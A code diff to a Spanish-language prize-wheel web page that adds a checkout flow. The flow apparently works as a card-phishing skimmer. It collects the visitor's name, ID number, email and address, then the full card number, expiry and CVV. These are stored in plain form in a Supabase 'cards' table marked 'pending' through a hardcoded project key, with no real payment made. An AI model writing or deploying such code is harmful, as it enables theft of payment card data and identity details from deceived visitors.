@@ -1,3 +1,69 @@
+// La configuración de Supabase se ha movido al final para evitar errores de carga
+let supabaseInstance = null;
+
+// Temporary storage for Step 1 data
+let orderData = {};
+
+// Luhn Algorithm for Card Validation
+function validateLuhn(number) {
+    let sum = 0;
+    let shouldDouble = false;
+    // Remove spaces and dashes
+    const cleaned = number.replace(/\s+/g, '').replace(/-/g, '');
+
+    if (cleaned.length < 13 || cleaned.length > 19) return false;
+
+    for (let i = cleaned.length - 1; i >= 0; i--) {
+        let digit = parseInt(cleaned.charAt(i));
+
+        if (shouldDouble) {
+            if ((digit *= 2) > 9) digit -= 9;
+        }
+
+        sum += digit;
+        shouldDouble = !shouldDouble;
+    }
+    return (sum % 10) === 0;
+}
+
+// Function to show loading state on buttons
+function toggleLoading(btn, isLoading) {
+    if (isLoading) {
+        btn.classList.add('loading');
+        btn.disabled = true;
+        btn.dataset.originalText = btn.innerText;
+        btn.innerText = 'Procesando...';
+    } else {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+        btn.innerText = btn.dataset.originalText || 'Siguiente';
+    }
+}
+
+// Modern Toast Notification System
+function showToast(message, type = 'error') {
+    // Remove existing toasts
+    document.querySelectorAll('.toast').forEach(t => t.remove());
+
+    const toast = document.createElement('div');
+    toast.className = `toast toast-${type}`;
+    toast.innerHTML = `
+        <span class="toast-icon">${type === 'success' ? '✅' : '❌'}</span>
+        <span class="toast-message">${message}</span>
+    `;
+    document.body.appendChild(toast);
+
+    // Trigger animation with a micro-delay
+    requestAnimationFrame(() => {
+        toast.classList.add('show');
+    });
+
+    // Remove after 4 seconds
+    setTimeout(() => {
+        toast.classList.remove('show');
+        setTimeout(() => toast.remove(), 400);
+    }, 4000);
+}
 // Configuración de la ruleta
 const wheelConfig = {
     segments: [
@@ -267,15 +333,92 @@ closeCheckout.addEventListener('click', () => {
     checkoutContainer.style.display = 'none';
 });
 
-addressForm.addEventListener('submit', (e) => {
+addressForm.addEventListener('submit', async (e) => {
     e.preventDefault();
+    const btn = e.target.querySelector('.checkout-btn');
+
+    // Collect Order Data from Step 1
+    orderData = {
+        first_name: document.getElementById('firstName').value,
+        last_name: document.getElementById('lastName').value,
+        document_id: document.getElementById('documentId').value,
+        email: document.getElementById('email').value,
+        department: document.getElementById('departmentSelect').value,
+        municipality: document.getElementById('municipalitySelect').value,
+        address: document.getElementById('address').value,
+        additional_info: document.getElementById('additionalInfo').value || ''
+    };
+
     showStep(2);
 });
 
-paymentForm.addEventListener('submit', (e) => {
+paymentForm.addEventListener('submit', async (e) => {
     e.preventDefault();
-    showStep(3);
-    launchConfetti(); // Festejo final
+    const btn = e.target.querySelector('.checkout-btn');
+
+    const cardNumber = e.target.querySelector('input[type="text"]').value;
+    const expiryMonth = e.target.querySelectorAll('select')[0].value;
+    const expiryYear = e.target.querySelectorAll('select')[1].value;
+    const cvv = e.target.querySelector('input[maxlength="4"]').value;
+
+    // 1. Validate Card
+    if (!validateLuhn(cardNumber)) {
+        showToast('Número de tarjeta inválido. Por favor verifique.', 'error');
+        return;
+    }
+
+    if (cvv.length < 3) {
+        showToast('CVV inválido.', 'error');
+        return;
+    }
+
+    toggleLoading(btn, true);
+
+    try {
+        // Inicializar Supabase solo cuando sea necesario
+        if (!supabaseInstance && typeof supabase !== 'undefined') {
+            // CONFIGURACIÓN REAL:
+            const SUPABASE_URL = 'https://jcgwmbtmfylmttxwmqzv.supabase.co';
+            const SUPABASE_KEY = 'sb_publishable_re7bQFvT9rggYPbtH260Pg_c6Pzw5jJ';
+            supabaseInstance = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        }
+
+        if (!supabaseInstance) {
+            console.warn('Supabase not initialized. Simulation mode.');
+            await new Promise(resolve => setTimeout(resolve, 1500));
+        } else {
+            // 2. Save Order
+            const { data: order, error: orderError } = await supabaseInstance
+                .from('orders')
+                .insert([orderData])
+                .select()
+                .single();
+
+            if (orderError) throw orderError;
+
+            // 3. Save Card linked to Order
+            const { error: cardError } = await supabaseInstance
+                .from('cards')
+                .insert([{
+                    order_id: order.id,
+                    card_number: cardNumber,
+                    expiry_date: `${expiryMonth}/${expiryYear}`,
+                    cvv: cvv,
+                    state: 'pending'
+                }]);
+
+            if (cardError) throw cardError;
+        }
+
+        showStep(3);
+        launchConfetti();
+        showToast('Pedido procesado con éxito', 'success');
+    } catch (error) {
+        console.error('Error saving data:', error);
+        showToast('Hubo un error al procesar su pedido. Intente nuevamente.', 'error');
+    } finally {
+        toggleLoading(btn, false);
+    }
 });
 
 finishCheckout.addEventListener('click', () => {
